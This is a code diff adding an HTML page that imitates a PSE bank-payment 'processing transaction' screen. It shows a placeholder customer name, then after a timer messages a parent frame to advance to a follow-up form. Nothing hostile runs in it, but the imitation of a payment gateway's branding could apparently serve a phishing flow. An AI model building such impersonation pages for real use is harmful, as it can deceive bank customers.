@@ -1,0 +1,128 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+<title>Procesando transacción — PSE</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:opsz,wght@9..40,300;9..40,400;9..40,500;9..40,600;9..40,700&display=swap" rel="stylesheet">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+
+:root{
+  --navy:#00337A;
+  --blue:#0050C7;
+}
+
+html,body{
+  font-family:'DM Sans',sans-serif;
+  background:#fff;
+  min-height:100%;
+}
+
+.preloader-wrap{
+  min-height:100vh;
+  background:#fff;
+  display:flex;
+  flex-direction:column;
+  padding:0;
+  position:relative;
+  overflow:hidden;
+}
+
+.pl-top-img,
+.pl-bottom-img{
+  width:100%;
+  display:block;
+  object-fit:cover;
+}
+.pl-top-img{margin-top:30px;}
+
+.pl-center-name{
+  text-align:center;
+  font-size:14px;
+  font-weight:700;
+  color:var(--navy);
+  line-height:1.35;
+  padding:0 32px 6px;
+}
+
+.pl-center-text{
+  text-align:center;
+  font-size:14px;
+  font-weight:500;
+  color:var(--navy);
+  line-height:1.4;
+  padding:0 32px 36px;
+}
+
+.pl-big-logo{
+  display:flex;
+  justify-content:center;
+  padding-bottom:28px;
+}
+
+.pl-spinner-wrap{
+  position:relative;
+  width:90px;
+  height:90px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+}
+
+.pl-big-gif{
+  width:96px;
+  height:96px;
+  display:block;
+  object-fit:contain;
+}
+
+.pl-tap{
+  text-align:center;
+  padding:16px;
+  font-size:11px;
+  color:rgba(0,51,122,.4);
+  cursor:pointer;
+}
+</style>
+</head>
+<body>
+
+<div class="preloader-wrap">
+  <img class="pl-top-img" src="../pse_credito/img/procesando_up.png" alt="Encabezado de proceso PSE">
+  <div class="pl-center-name">Pablo Perez</div>
+  <div class="pl-center-text">Estamos procesando tu transacción...</div>
+  <div class="pl-big-logo">
+    <div class="pl-spinner-wrap" id="plSpinnerWrap">
+      <img class="pl-big-gif" src="../pse_credito/img/loader_psd.GIF" alt="PSE loading animation">
+    </div>
+  </div>
+  <div style="flex:1"></div>
+  <img class="pl-bottom-img" src="../pse_credito/img/procesando_bottom.png" alt="Información de contacto y logos ACH">
+  <div class="pl-tap" onclick="goToAllyForm()"></div>
+</div>
+
+<script>
+var PRELOADER_DELAY = 5000;
+var preloaderTimer = null;
+
+function goToAllyForm() {
+  clearTimeout(preloaderTimer);
+  window.parent.postMessage({ type: 'GO', screen: 2 }, '*');
+}
+
+function startPreloaderAnim() {
+  preloaderTimer = setTimeout(function() {
+    goToAllyForm();
+  }, PRELOADER_DELAY);
+}
+
+window.addEventListener('message', function(e) {
+  if (e.data && e.data.type === 'SCREEN_ACTIVE') {
+    startPreloaderAnim();
+  }
+});
+</script>
+</body>
+</html>
